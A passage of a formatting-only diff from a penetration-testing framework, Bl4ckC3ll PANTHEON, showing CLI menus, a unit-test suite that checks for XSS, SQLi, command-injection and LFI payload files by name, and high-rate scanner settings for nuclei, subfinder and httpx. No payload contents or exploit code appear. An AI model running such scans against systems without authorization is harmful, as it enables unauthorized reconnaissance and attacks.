print(\"- Technical findings\")\n         print(\"- Risk assessment matrix\")\n         print(\"- Remediation recommendations\")\n-        \n+\n         input(\"\\nPress Enter to continue...\")\n-    \n+\n     def configuration_menu(self):\n         \"\"\"Configuration management interface\"\"\"\n         print(\"\\n\u2699\ufe0f  CONFIGURATION\")\n         print(\"-\" * 50)\n         print(\"Current configuration:\")\n-        \n+\n         for section, settings in self.config.items():\n             print(f\"\\n[{section.upper()}]\")\n             if isinstance(settings, dict):\n                 for key, value in settings.items():\n                     print(f\"  {key}: {value}\")\n             else:\n                 print(f\"  {section}: {settings}\")\n-        \n+\n         input(\"\\nPress Enter to continue...\")\n-    \n+\n     def diagnostics_menu(self):\n         \"\"\"System diagnostics interface\"\"\"\n         print(\"\\n\ud83d\udd27 TOOL DIAGNOSTICS\")\n         print(\"-\" * 50)\n-        \n+\n         # Check Python libraries\n         print(\"\ud83d\udcda Python Library Status:\")\n         libraries = [\n-            ('requests', HAS_REQUESTS, 'HTTP client library'),\n-            ('psutil', HAS_PSUTIL, 'System monitoring'),\n-            ('textual', HAS_TEXTUAL, 'Terminal UI framework'),\n-            ('numpy/pandas/sklearn', HAS_ML, 'Machine learning capabilities'),\n-            ('matplotlib/plotly', HAS_VISUALIZATION, 'Data visualization'),\n-            ('cryptography', HAS_CRYPTO, 'Cryptographic functions')\n+            (\"requests\", HAS_REQUESTS, \"HTTP client library\"),\n+            (\"psutil\", HAS_PSUTIL, \"System monitoring\"),\n+            (\"textual\", HAS_TEXTUAL, \"Terminal UI framework\"),\n+            (\"numpy/pandas/sklearn\", HAS_ML, \"Machine learning capabilities\"),\n+            (\"matplotlib/plotly\", HAS_VISUALIZATION, \"Data visualization\"),\n+            (\"cryptography\", HAS_CRYPTO, \"Cryptographic functions\"),\n         ]\n-        \n+\n         for name, available, description in libraries:\n             status = \"\u2705 AVAILABLE\" if available else \"\u274c MISSING\"\n             print(f\"  {name:20} {status:12} - {description}\")\n-        \n+\n         # System information\n         print(f\"\\n\ud83d\udda5\ufe0f  System Information:\")\n         print(f\"  OS: {platform.system()} {platform.release()}\")\n         print(f\"  Python: {platform.python_version()}\")\n         print(f\"  Architecture: {platform.machine()}\")\n-        \n+\n         if HAS_PSUTIL:\n             print(f\"  CPU Cores: {psutil.cpu_count()}\")\n             print(f\"  Memory: {psutil.virtual_memory().total // (1024**3)}GB\")\n-        \n+\n         input(\"\\nPress Enter to continue...\")\n-    \n+\n     def help_menu(self):\n         \"\"\"Help and documentation interface\"\"\"\n         print(\"\\n\ud83d\udcda HELP & DOCUMENTATION\")\n         print(\"-\" * 50)\n-        print(\"\"\"\n+        print(\n+            \"\"\"\n BL4CKC3LL PANTHEON MASTER - Consolidated Security Testing Framework\n \n This is a comprehensive security testing framework that combines multiple\n specialized tools into a single, unified interface. The framework includes:\n \n@@ -1516,42 +1742,45 @@\n This tool is intended for educational purposes and authorized security\n testing only. Users are responsible for ensuring they have proper\n authorization before testing any systems.\n \n \ud83d\udcd6 For detailed documentation, see the README.md file.\n-        \"\"\")\n-        \n+        \"\"\"\n+        )\n+\n         input(\"\\nPress Enter to continue...\")\n-    \n+\n     def run(self):\n         \"\"\"Run the main application loop\"\"\"\n         self.show_banner()\n-        \n+\n         try:\n             while True:\n                 self.show_main_menu()\n                 choice = input(f\"\\nSelect option (1-17): \")\n-                \n+\n                 if not self.handle_menu_selection(choice):\n                     break\n-                    \n+\n         except KeyboardInterrupt:\n             print(\"\\n\\n\ud83d\uded1 Application interrupted by user\")\n         except Exception as e:\n             self.logger.error(f\"Unexpected error: {e}\")\n         finally:\n             print(\"\\n\ud83d\udc4b Thank you for using Bl4ckC3ll PANTHEON MASTER!\")\n             print(\"\ud83d\udd12 Stay secure and test responsibly!\")\n \n+\n # ============================================================================\n # MAIN ENTRY POINT\n # ============================================================================\n \n+\n def main():\n     \"\"\"Main entry point\"\"\"\n     import argparse\n-    \n+\n     parser = argparse.ArgumentParser(\n         description=\"Bl4ckC3ll PANTHEON MASTER - Consolidated Security Testing Framework\",\n         formatter_class=argparse.RawDescriptionHelpFormatter,\n         epilog=\"\"\"\n Examples:\n@@ -1559,51 +1788,58 @@\n   python bl4ckc3ll_pantheon_master.py --tui              # Launch TUI interface\n   python bl4ckc3ll_pantheon_master.py --target domain.com # Quick scan\n   python bl4ckc3ll_pantheon_master.py --help             # Show this help\n \n Educational use only. Ensure proper authorization before testing.\n-        \"\"\"\n+        \"\"\",\n     )\n-    \n-    parser.add_argument(\"--version\", action=\"version\", version=f\"Pantheon Master {VERSION}\")\n-    parser.add_argument(\"--tui\", action=\"store_true\", help=\"Launch TUI interface directly\")\n+\n+    parser.add_argument(\n+        \"--version\", action=\"version\", version=f\"Pantheon Master {VERSION}\"\n+    )\n+    parser.add_argument(\n+        \"--tui\", action=\"store_true\", help=\"Launch TUI interface directly\"\n+    )\n     parser.add_argument(\"--target\", type=str, help=\"Quick target scan (domain or IP)\")\n     parser.add_argument(\"--config\", type=str, help=\"Configuration file path\")\n     parser.add_argument(\"--verbose\", action=\"store_true\", help=\"Enable verbose output\")\n     parser.add_argument(\"--quiet\", action=\"store_true\", help=\"Minimize output\")\n-    \n+\n     args = parser.parse_args()\n-    \n+\n     # Configure logging level\n     if args.verbose:\n         logging.basicConfig(level=logging.DEBUG)\n     elif args.quiet:\n         logging.basicConfig(level=logging.ERROR)\n     else:\n         logging.basicConfig(level=logging.INFO)\n-    \n+\n     # Initialize CLI\n     cli = PantheonMasterCLI()\n-    \n+\n     # Handle command line arguments\n     if args.target:\n         # Quick scan mode\n-        if SecurityValidator.validate_domain(args.target) or SecurityValidator.validate_ip(args.target):\n-            cli.config['targets'] = [args.target]\n+        if SecurityValidator.validate_domain(\n+            args.target\n+        ) or SecurityValidator.validate_ip(args.target):\n+            cli.config[\"targets\"] = [args.target]\n             print(f\"\\n\ud83c\udfaf Quick scanning target: {args.target}\")\n             cli.bcar_reconnaissance_menu()\n         else:\n             print(f\"\u274c Invalid target format: {args.target}\")\n             return 1\n-    \n+\n     elif args.tui:\n         # Direct TUI launch\n         cli.launch_tui()\n-    \n+\n     else:\n         # Interactive CLI mode\n         cli.run()\n-    \n+\n     return 0\n \n+\n if __name__ == \"__main__\":\n-    sys.exit(main())\n\\ No newline at end of file\n+    sys.exit(main())\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_test_suite.py\t2025-09-14 19:10:58.550754+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_test_suite.py\t2025-09-14 19:23:10.739296+00:00\n@@ -14,352 +14,450 @@\n import sys\n \n # Add the main directory to Python path\n sys.path.insert(0, str(Path(__file__).parent))\n \n+\n class TestEnhancedCLI(unittest.TestCase):\n     \"\"\"Test enhanced CLI functionality\"\"\"\n-    \n+\n     def setUp(self):\n         self.script_path = Path(__file__).parent / \"bl4ckc3ll_p4nth30n.py\"\n         self.test_targets = [\"test.example.com\", \"127.0.0.1\"]\n-        \n+\n     def test_cli_help(self):\n         \"\"\"Test CLI help functionality\"\"\"\n-        result = subprocess.run([\n-            \"python3\", str(self.script_path), \"--help\"\n-        ], capture_output=True, text=True, timeout=30)\n-        \n+        result = subprocess.run(\n+            [\"python3\", str(self.script_path), \"--help\"],\n+            capture_output=True,\n+            text=True,\n+            timeout=30,\n+        )\n+\n         self.assertEqual(result.returncode, 0)\n         self.assertIn(\"Bl4ckC3ll_PANTHEON\", result.stdout)\n         self.assertIn(\"--recon\", result.stdout)\n         self.assertIn(\"--vuln\", result.stdout)\n         self.assertIn(\"--output\", result.stdout)\n-    \n+\n     def test_tool_check(self):\n         \"\"\"Test tool availability check\"\"\"\n-        result = subprocess.run([\n-            \"python3\", str(self.script_path), \"--check-tools\"\n-        ], capture_output=True, text=True, timeout=60)\n-        \n+        result = subprocess.run(\n+            [\"python3\", str(self.script_path), \"--check-tools\"],\n+            capture_output=True,\n+            text=True,\n+            timeout=60,\n+        )\n+\n         self.assertEqual(result.returncode, 0)\n         self.assertIn(\"Security tools available:\", result.stderr)\n-    \n+\n     def test_wordlist_update(self):\n         \"\"\"Test wordlist update functionality\"\"\"\n-        result = subprocess.run([\n-            \"python3\", str(self.script_path), \"--update-wordlists\"\n-        ], capture_output=True, text=True, timeout=60)\n-        \n+        result = subprocess.run(\n+            [\"python3\", str(self.script_path), \"--update-wordlists\"],\n+            capture_output=True,\n+            text=True,\n+            timeout=60,\n+        )\n+\n         self.assertEqual(result.returncode, 0)\n+\n \n class TestEnhancedWordlists(unittest.TestCase):\n     \"\"\"Test enhanced wordlist generation\"\"\"\n-    \n+\n     def setUp(self):\n         self.wordlists_dir = Path(__file__).parent / \"wordlists_extra\"\n         self.payloads_dir = Path(__file__).parent / \"payloads\"\n-    \n+\n     def test_wordlists_exist(self):\n         \"\"\"Test that enhanced wordlists were created\"\"\"\n         expected_wordlists = [\n             \"technology_php.txt\",\n             \"technology_python.txt\",\n             \"technology_nodejs.txt\",\n             \"cloud_aws.txt\",\n             \"cloud_azure.txt\",\n             \"api_endpoints.txt\",\n             \"security_admin_panels.txt\",\n-            \"security_login_pages.txt\"\n+            \"security_login_pages.txt\",\n         ]\n-        \n+\n         for wordlist in expected_wordlists:\n             wordlist_path = self.wordlists_dir / wordlist\n             self.assertTrue(wordlist_path.exists(), f\"Wordlist {wordlist} should exist\")\n-            \n+\n             # Check that wordlist has content\n-            with open(wordlist_path, 'r') as f:\n+            with open(wordlist_path, \"r\") as f:\n                 content = f.read().strip()\n-                self.assertTrue(len(content) > 0, f\"Wordlist {wordlist} should not be empty\")\n-    \n+                self.assertTrue(\n+                    len(content) > 0, f\"Wordlist {wordlist} should not be empty\"\n+                )\n+\n     def test_payloads_exist(self):\n         \"\"\"Test that enhanced payloads were created\"\"\"\n         expected_payloads = [\n             \"xss_payloads.txt\",\n             \"sqli_payloads.txt\",\n             \"command_injection_payloads.txt\",\n             \"lfi_payloads.txt\",\n-            \"comprehensive_payloads.json\"\n+            \"comprehensive_payloads.json\",\n         ]\n-        \n+\n         for payload_file in expected_payloads:\n             payload_path = self.payloads_dir / payload_file\n-            self.assertTrue(payload_path.exists(), f\"Payload file {payload_file} should exist\")\n-            \n+            self.assertTrue(\n+                payload_path.exists(), f\"Payload file {payload_file} should exist\"\n+            )\n+\n             # Check that payload file has content\n-            with open(payload_path, 'r') as f:\n+            with open(payload_path, \"r\") as f:\n                 content = f.read().strip()\n-                self.assertTrue(len(content) > 0, f\"Payload file {payload_file} should not be empty\")\n-    \n+                self.assertTrue(\n+                    len(content) > 0, f\"Payload file {payload_file} should not be empty\"\n+                )\n+\n     def test_comprehensive_payloads_structure(self):\n         \"\"\"Test comprehensive payloads JSON structure\"\"\"\n         comprehensive_file = self.payloads_dir / \"comprehensive_payloads.json\"\n         self.assertTrue(comprehensive_file.exists())\n-        \n-        with open(comprehensive_file, 'r') as f:\n+\n+        with open(comprehensive_file, \"r\") as f:\n             payloads_data = json.load(f)\n-        \n-        expected_keys = ['xss', 'sqli', 'command_injection', 'lfi', 'technology_wordlists']\n+\n+        expected_keys = [\n+            \"xss\",\n+            \"sqli\",\n+            \"command_injection\",\n+            \"lfi\",\n+            \"technology_wordlists\",\n+        ]\n         for key in expected_keys:\n-            self.assertIn(key, payloads_data, f\"Key {key} should exist in comprehensive payloads\")\n-            self.assertTrue(len(payloads_data[key]) > 0, f\"Section {key} should not be empty\")\n+            self.assertIn(\n+                key, payloads_data, f\"Key {key} should exist in comprehensive payloads\"\n+            )\n+            self.assertTrue(\n+                len(payloads_data[key]) > 0, f\"Section {key} should not be empty\"\n+            )\n+\n \n class TestEnhancedScanning(unittest.TestCase):\n     \"\"\"Test enhanced scanning capabilities\"\"\"\n-    \n+\n     def setUp(self):\n         self.scanning_module = Path(__file__).parent / \"enhanced_scanning.py\"\n-    \n+\n     def test_scanning_module_import(self):\n         \"\"\"Test that enhanced scanning module can be imported\"\"\"\n         try:\n             import enhanced_scanning\n-            self.assertTrue(hasattr(enhanced_scanning, 'AdaptiveScanManager'))\n-            self.assertTrue(hasattr(enhanced_scanning, 'run_enhanced_scanning'))\n+\n+            self.assertTrue(hasattr(enhanced_scanning, \"AdaptiveScanManager\"))\n+            self.assertTrue(hasattr(enhanced_scanning, \"run_enhanced_scanning\"))\n         except ImportError as e:\n             self.fail(f\"Failed to import enhanced scanning module: {e}\")\n-    \n+\n     def test_adaptive_scan_manager_init(self):\n         \"\"\"Test AdaptiveScanManager initialization\"\"\"\n         try:\n             import enhanced_scanning\n-            config = {'scan_depth': 3, 'max_threads': 10, 'rate_limit': 5}\n+\n+            config = {\"scan_depth\": 3, \"max_threads\": 10, \"rate_limit\": 5}\n             manager = enhanced_scanning.AdaptiveScanManager(config)\n-            \n+\n             self.assertEqual(manager.scan_depth, 3)\n             self.assertEqual(manager.max_threads, 10)\n             self.assertEqual(manager.rate_limit, 5)\n-            self.assertTrue(hasattr(manager, 'wordlists'))\n-            self.assertTrue(hasattr(manager, 'payloads'))\n+            self.assertTrue(hasattr(manager, \"wordlists\"))\n+            self.assertTrue(hasattr(manager, \"payloads\"))\n         except Exception as e:\n             self.fail(f\"Failed to initialize AdaptiveScanManager: {e}\")\n \n+\n class TestOutputFormats(unittest.TestCase):\n     \"\"\"Test different output formats\"\"\"\n-    \n+\n     def setUp(self):\n         self.script_path = Path(__file__).parent / \"bl4ckc3ll_p4nth30n.py\"\n         self.temp_dir = Path(tempfile.mkdtemp())\n-    \n+\n     def tearDown(self):\n         # Clean up temporary files\n         import shutil\n+\n         if self.temp_dir.exists():\n             shutil.rmtree(self.temp_dir)\n-    \n+\n     def test_json_output_format(self):\n         \"\"\"Test JSON output format\"\"\"\n         output_file = self.temp_dir / \"test_output.json\"\n-        \n+\n         # Create a simple test targets file\n         targets_file = self.temp_dir / \"targets.txt\"\n-        with open(targets_file, 'w') as f:\n+        with open(targets_file, \"w\") as f:\n             f.write(\"test.example.com\\n\")\n-        \n-        result = subprocess.run([\n-            \"python3\", str(self.script_path),\n-            \"-t\", str(targets_file),\n-            \"--batch\", \"--recon\",\n-            \"--output\", \"json\",\n-            \"--outfile\", str(output_file),\n-            \"--quiet\"\n-        ], capture_output=True, text=True, timeout=30)\n-        \n+\n+        result = subprocess.run(\n+            [\n+                \"python3\",\n+                str(self.script_path),\n+                \"-t\",\n+                str(targets_file),\n+                \"--batch\",\n+                \"--recon\",\n+                \"--output\",\n+                \"json\",\n+                \"--outfile\",\n+                str(output_file),\n+                \"--quiet\",\n+            ],\n+            capture_output=True,\n+            text=True,\n+            timeout=30,\n+        )\n+\n         if result.returncode == 0 and output_file.exists():\n             # Check if output is valid JSON\n             try:\n-                with open(output_file, 'r') as f:\n+                with open(output_file, \"r\") as f:\n                     json.load(f)\n             except json.JSONDecodeError:\n                 self.fail(\"Output is not valid JSON\")\n \n+\n class TestIntegration(unittest.TestCase):\n     \"\"\"Test integration between components\"\"\"\n-    \n+\n     def test_bcar_integration(self):\n         \"\"\"Test BCAR integration\"\"\"\n         try:\n             import bl4ckc3ll_p4nth30n as main_script\n-            self.assertTrue(hasattr(main_script, 'BCAR_AVAILABLE'))\n+\n+            self.assertTrue(hasattr(main_script, \"BCAR_AVAILABLE\"))\n         except ImportError as e:\n             self.fail(f\"Failed to import main script: {e}\")\n-    \n+\n     def test_enhanced_wordlist_integration(self):\n         \"\"\"Test enhanced wordlist integration with main script\"\"\"\n         try:\n             import enhanced_wordlists\n+\n             # Test that we can generate wordlists\n             generator = enhanced_wordlists.EnhancedWordlistGenerator()\n             tech_wordlists = generator.generate_technology_specific_wordlists()\n             self.assertTrue(len(tech_wordlists) > 0)\n-            self.assertIn('php', tech_wordlists)\n+            self.assertIn(\"php\", tech_wordlists)\n         except Exception as e:\n             self.fail(f\"Enhanced wordlist integration failed: {e}\")\n \n+\n class TestPerformance(unittest.TestCase):\n     \"\"\"Test performance aspects\"\"\"\n-    \n+\n     def test_startup_time(self):\n         \"\"\"Test that script starts up in reasonable time\"\"\"\n         start_time = time.time()\n-        \n-        result = subprocess.run([\n-            \"python3\", str(Path(__file__).parent / \"bl4ckc3ll_p4nth30n.py\"),\n-            \"--help\"\n-        ], capture_output=True, text=True, timeout=30)\n-        \n+\n+        result = subprocess.run(\n+            [\"python3\", str(Path(__file__).parent / \"bl4ckc3ll_p4nth30n.py\"), \"--help\"],\n+            capture_output=True,\n+            text=True,\n+            timeout=30,\n+        )\n+\n         end_time = time.time()\n         startup_time = end_time - start_time\n-        \n+\n         self.assertEqual(result.returncode, 0)\n         self.assertLess(startup_time, 10, \"Startup time should be less than 10 seconds\")\n-    \n+\n     def test_wordlist_generation_performance(self):\n         \"\"\"Test wordlist generation performance\"\"\"\n         start_time = time.time()\n-        \n-        result = subprocess.run([\n-            \"python3\", str(Path(__file__).parent / \"enhanced_wordlists.py\")\n-        ], capture_output=True, text=True, timeout=60)\n-        \n+\n+        result = subprocess.run(\n+            [\"python3\", str(Path(__file__).parent / \"enhanced_wordlists.py\")],\n+            capture_output=True,\n+            text=True,\n+            timeout=60,\n+        )\n+\n         end_time = time.time()\n         generation_time = end_time - start_time\n-        \n+\n         self.assertEqual(result.returncode, 0)\n-        self.assertLess(generation_time, 30, \"Wordlist generation should complete in less than 30 seconds\")\n+        self.assertLess(\n+            generation_time,\n+            30,\n+            \"Wordlist generation should complete in less than 30 seconds\",\n+        )\n+\n \n class TestErrorHandling(unittest.TestCase):\n     \"\"\"Test error handling and edge cases\"\"\"\n-    \n+\n     def setUp(self):\n         self.script_path = Path(__file__).parent / \"bl4ckc3ll_p4nth30n.py\"\n-    \n+\n     def test_invalid_target(self):\n         \"\"\"Test handling of invalid targets\"\"\"\n-        result = subprocess.run([\n-            \"python3\", str(self.script_path),\n-            \"-t\", \"invalid..domain..name\",\n-            \"--batch\", \"--recon\", \"--quiet\"\n-        ], capture_output=True, text=True, timeout=30)\n-        \n+        result = subprocess.run(\n+            [\n+                \"python3\",\n+                str(self.script_path),\n+                \"-t\",\n+                \"invalid..domain..name\",\n+                \"--batch\",\n+                \"--recon\",\n+                \"--quiet\",\n+            ],\n+            capture_output=True,\n+            text=True,\n+            timeout=30,\n+        )\n+\n         # Should handle gracefully (return code 1 is acceptable for invalid input)\n         self.assertIn(result.returncode, [0, 1])\n-    \n+\n     def test_nonexistent_targets_file(self):\n         \"\"\"Test handling of non-existent targets file\"\"\"\n-        result = subprocess.run([\n-            \"python3\", str(self.script_path),\n-            \"-t\", \"/nonexistent/file.txt\",\n-            \"--batch\", \"--recon\", \"--quiet\"\n-        ], capture_output=True, text=True, timeout=30)\n-        \n+        result = subprocess.run(\n+            [\n+                \"python3\",\n+                str(self.script_path),\n+                \"-t\",\n+                \"/nonexistent/file.txt\",\n+                \"--batch\",\n+                \"--recon\",\n+                \"--quiet\",\n+            ],\n+            capture_output=True,\n+            text=True,\n+            timeout=30,\n+        )\n+\n         # Should handle gracefully (return code 1 is acceptable for file not found)\n         self.assertIn(result.returncode, [0, 1])\n-    \n+\n     def test_conflicting_options(self):\n         \"\"\"Test handling of conflicting CLI options\"\"\"\n-        result = subprocess.run([\n-            \"python3\", str(self.script_path),\n-            \"--interactive\", \"--batch\",\n-            \"-t\", \"test.example.com\"\n-        ], capture_output=True, text=True, timeout=30)\n-        \n+        result = subprocess.run(\n+            [\n+                \"python3\",\n+                str(self.script_path),\n+                \"--interactive\",\n+                \"--batch\",\n+                \"-t\",\n+                \"test.example.com\",\n+            ],\n+            capture_output=True,\n+            text=True,\n+            timeout=30,\n+        )\n+\n         # Should handle gracefully\n         self.assertIn(result.returncode, [0, 1, 2])\n+\n \n def run_comprehensive_tests():\n     \"\"\"Run all test suites\"\"\"\n     print(\"\ud83e\uddea Starting Enhanced Comprehensive Test Suite for Bl4ckC3ll_PANTHEON\")\n     print(\"=\" * 70)\n-    \n+\n     # Test suites to run\n     test_suites = [\n         TestEnhancedCLI,\n         TestEnhancedWordlists,\n         TestEnhancedScanning,\n         TestOutputFormats,\n         TestIntegration,\n         TestPerformance,\n-        TestErrorHandling\n+        TestErrorHandling,\n     ]\n-    \n+\n     all_results = []\n     total_tests = 0\n     total_failures = 0\n     total_errors = 0\n-    \n+\n     for test_suite_class in test_suites:\n         print(f\"\\n\ud83d\udd0d Running {test_suite_class.__name__}...\")\n-        \n+\n         # Create test suite\n         suite = unittest.TestLoader().loadTestsFromTestCase(test_suite_class)\n-        \n+\n         # Run tests\n-        runner = unittest.TextTestRunner(verbosity=1, stream=open(os.devnull, 'w'))\n+        runner = unittest.TextTestRunner(verbosity=1, stream=open(os.devnull, \"w\"))\n         result = runner.run(suite)\n-        \n+\n         # Collect results\n         suite_tests = result.testsRun\n         suite_failures = len(result.failures)\n         suite_errors = len(result.errors)\n         suite_success = suite_tests - suite_failures - suite_errors\n-        \n+\n         total_tests += suite_tests\n         total_failures += suite_failures\n         total_errors += suite_errors\n-        \n+\n         # Print results\n         if suite_failures == 0 and suite_errors == 0:\n-            print(f\"\u2705 {test_suite_class.__name__}: {suite_success}/{suite_tests} tests passed\")\n+            print(\n+                f\"\u2705 {test_suite_class.__name__}: {suite_success}/{suite_tests} tests passed\"\n+            )\n         else:\n-            print(f\"\u274c {test_suite_class.__name__}: {suite_success}/{suite_tests} tests passed, {suite_failures} failures, {suite_errors} errors\")\n-            \n+            print(\n+                f\"\u274c {test_suite_class.__name__}: {suite_success}/{suite_tests} tests passed, {suite_failures} failures, {suite_errors} errors\"\n+            )\n+\n             # Print failure details\n             for failure in result.failures:\n                 print(f\"   FAIL: {failure[0]}\")\n                 print(f\"   {failure[1].split('AssertionError:')[-1].strip()}\")\n-            \n+\n             for error in result.errors:\n                 print(f\"   ERROR: {error[0]}\")\n                 print(f\"   {error[1].split('Exception:')[-1].strip()}\")\n-        \n-        all_results.append({\n-            'suite': test_suite_class.__name__,\n-            'tests': suite_tests,\n-            'success': suite_success,\n-            'failures': suite_failures,\n-            'errors': suite_errors\n-        })\n-    \n+\n+        all_results.append(\n+            {\n+                \"suite\": test_suite_class.__name__,\n+                \"tests\": suite_tests,\n+                \"success\": suite_success,\n+                \"failures\": suite_failures,\n+                \"errors\": suite_errors,\n+            }\n+        )\n+\n     # Print summary\n     print(\"\\n\" + \"=\" * 70)\n     print(\"\ud83d\udcca ENHANCED TEST SUMMARY\")\n     print(\"=\" * 70)\n-    \n-    success_rate = ((total_tests - total_failures - total_errors) / total_tests * 100) if total_tests > 0 else 0\n-    \n+\n+    success_rate = (\n+        ((total_tests - total_failures - total_errors) / total_tests * 100)\n+        if total_tests > 0\n+        else 0\n+    )\n+\n     print(f\"Total Tests Run: {total_tests}\")\n     print(f\"Successful: {total_tests - total_failures - total_errors}\")\n     print(f\"Failures: {total_failures}\")\n     print(f\"Errors: {total_errors}\")\n     print(f\"Success Rate: {success_rate:.1f}%\")\n-    \n+\n     if total_failures == 0 and total_errors == 0:\n-        print(\"\\n\ud83c\udf89 All tests passed! Enhanced Bl4ckC3ll_PANTHEON is ready for production.\")\n+        print(\n+            \"\\n\ud83c\udf89 All tests passed! Enhanced Bl4ckC3ll_PANTHEON is ready for production.\"\n+        )\n         return True\n     else:\n-        print(f\"\\n\u26a0\ufe0f {total_failures + total_errors} test(s) failed. Please review and fix issues.\")\n+        print(\n+            f\"\\n\u26a0\ufe0f {total_failures + total_errors} test(s) failed. Please review and fix issues.\"\n+        )\n         return False\n+\n \n if __name__ == \"__main__\":\n     success = run_comprehensive_tests()\n-    sys.exit(0 if success else 1)\n\\ No newline at end of file\n+    sys.exit(0 if success else 1)\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_scanning.py\t2025-09-14 19:10:58.550754+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_scanning.py\t2025-09-14 19:23:10.911248+00:00\n@@ -17,629 +17,693 @@\n import logging\n \n # Enhanced modules integration\n try:\n     from enhanced_tool_manager import enhanced_which\n+\n     ENHANCED_TOOL_MANAGER_AVAILABLE = True\n except ImportError:\n     ENHANCED_TOOL_MANAGER_AVAILABLE = False\n+\n     def enhanced_which(tool):\n         return None\n+\n \n # Import main components - using try/except for graceful fallback\n try:\n     from bl4ckc3ll_p4nth30n import (\n-        safe_run_command, which, atomic_write, read_lines,\n-        PantheonLogger, validate_domain_input, validate_ip_input,\n-        rate_limiter\n+        safe_run_command,\n+        which,\n+        atomic_write,\n+        read_lines,\n+        PantheonLogger,\n+        validate_domain_input,\n+        validate_ip_input,\n+        rate_limiter,\n     )\n except ImportError:\n     # Fallback implementations for testing\n     import subprocess\n     import shutil\n-    \n+\n     def safe_run_command(cmd, timeout=60):\n         try:\n-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)\n+            result = subprocess.run(\n+                cmd, capture_output=True, text=True, timeout=timeout\n+            )\n             return result.returncode, result.stdout, result.stderr\n         except Exception as e:\n             return 1, \"\", str(e)\n-    \n+\n     def which(tool):\n         return shutil.which(tool)\n-    \n+\n     def atomic_write(path, data):\n-        with open(path, 'w') as f:\n+        with open(path, \"w\") as f:\n             f.write(data)\n         return True\n-    \n+\n     def read_lines(path):\n         try:\n-            with open(path, 'r') as f:\n+            with open(path, \"r\") as f:\n                 return [line.strip() for line in f if line.strip()]\n         except:\n             return []\n-    \n+\n     class PantheonLogger:\n         def __init__(self, name):\n             self.name = name\n+\n         def log(self, msg, level=\"INFO\"):\n             print(f\"[{level}] {self.name}: {msg}\")\n-    \n+\n     def validate_domain_input(domain):\n-        return bool(domain and '.' in domain)\n-    \n+        return bool(domain and \".\" in domain)\n+\n     def validate_ip_input(ip):\n         try:\n             import ipaddress\n+\n             ipaddress.ip_address(ip)\n             return True\n         except:\n             return False\n-    \n+\n     class MockRateLimiter:\n         def is_allowed(self, key):\n             return True\n+\n         def wait_time(self, key):\n             return 0\n-    \n+\n     rate_limiter = MockRateLimiter()\n+\n \n @dataclass\n class ScanResult:\n     \"\"\"Represents a scan operation result with performance metrics\"\"\"\n+\n     target: str\n     tool: str\n     start_time: float\n     end_time: float\n     success: bool\n     output_size: int = 0\n     error_message: Optional[str] = None\n     findings_count: int = 0\n-    \n+\n     @property\n     def duration(self) -> float:\n         return self.end_time - self.start_time\n-    \n+\n     @property\n     def success_score(self) -> float:\n         \"\"\"Calculate success score based on multiple factors\"\"\"\n         if not self.success:\n             return 0.0\n-        \n+\n         score = 1.0\n-        \n+\n         # Bonus for findings\n         if self.findings_count > 0:\n             score += min(0.2, self.findings_count * 0.01)\n-        \n+\n         # Penalty for very slow scans\n         if self.duration > 300:  # 5 minutes\n             score -= 0.1\n-        \n+\n         # Bonus for reasonable output size\n         if 100 < self.output_size < 1000000:  # 100B to 1MB\n             score += 0.05\n-        \n+\n         return min(1.0, score)\n+\n \n @dataclass\n class PerformanceMetrics:\n     \"\"\"Track performance metrics for adaptive scanning\"\"\"\n+\n     success_rate: float = 0.0\n     average_duration: float = 0.0\n     throughput: float = 0.0  # targets per minute\n     error_rate: float = 0.0\n     last_updated: datetime = field(default_factory=datetime.now)\n-    \n+\n     def update(self, results: List[ScanResult]):\n         \"\"\"Update metrics based on recent results\"\"\"\n         if not results:\n             return\n-        \n+\n         total = len(results)\n         successful = sum(1 for r in results if r.success)\n-        \n+\n         self.success_rate = successful / total\n         self.error_rate = 1.0 - self.success_rate\n         self.average_duration = statistics.mean(r.duration for r in results)\n-        \n+\n         # Calculate throughput (targets per minute)\n         if self.average_duration > 0:\n             self.throughput = 60.0 / self.average_duration\n-        \n+\n         self.last_updated = datetime.now()\n+\n \n class AdaptiveScanManager:\n     \"\"\"\n     Manages adaptive scanning with success rate optimization\n     Automatically adjusts parameters based on performance\n     \"\"\"\n-    \n-    def __init__(self, config: Optional[Dict[str, Any]] = None, target_success_rate: float = 0.96):\n+\n+    def __init__(\n+        self, config: Optional[Dict[str, Any]] = None, target_success_rate: float = 0.96\n+    ):\n         # Initialize from config if provided\n         if config:\n-            self.scan_depth = config.get('scan_depth', 3)\n-            self.max_threads = config.get('max_threads', 10)\n-            self.rate_limit = config.get('rate_limit', 5)\n+            self.scan_depth = config.get(\"scan_depth\", 3)\n+            self.max_threads = config.get(\"max_threads\", 10)\n+            self.rate_limit = config.get(\"rate_limit\", 5)\n         else:\n             self.scan_depth = 3\n             self.max_threads = 10\n             self.rate_limit = 5\n-            \n+\n         self.target_success_rate = target_success_rate\n         self.logger = PantheonLogger(\"AdaptiveScanManager\")\n         self.results_history: deque = deque(maxlen=1000)  # Keep last 1000 results\n         self.metrics_by_tool: Dict[str, PerformanceMetrics] = {}\n         self.adaptive_settings: Dict[str, Dict] = self._initialize_adaptive_settings()\n         self.lock = threading.Lock()\n-        \n+\n         # Initialize wordlists and payloads attributes expected by tests\n         self.wordlists = []\n         self.payloads = []\n-        \n+\n     def _initialize_adaptive_settings(self) -> Dict[str, Dict]:\n         \"\"\"Initialize adaptive settings for different tools\"\"\"\n         return {\n-            'nuclei': {\n-                'initial_rps': 500,\n-                'max_rps': 1000,\n-                'min_rps': 50,\n-                'concurrency': 150,\n-                'timeout': 30\n+            \"nuclei\": {\n+                \"initial_rps\": 500,\n+                \"max_rps\": 1000,\n+                \"min_rps\": 50,\n+                \"concurrency\": 150,\n+                \"timeout\": 30,\n             },\n-            'subfinder': {\n-                'timeout': 60,\n-                'max_retries': 3,\n-                'rate_limit': 10\n+            \"subfinder\": {\"timeout\": 60, \"max_retries\": 3, \"rate_limit\": 10},\n+            \"httpx\": {\n+                \"threads\": 50,\n+                \"timeout\": 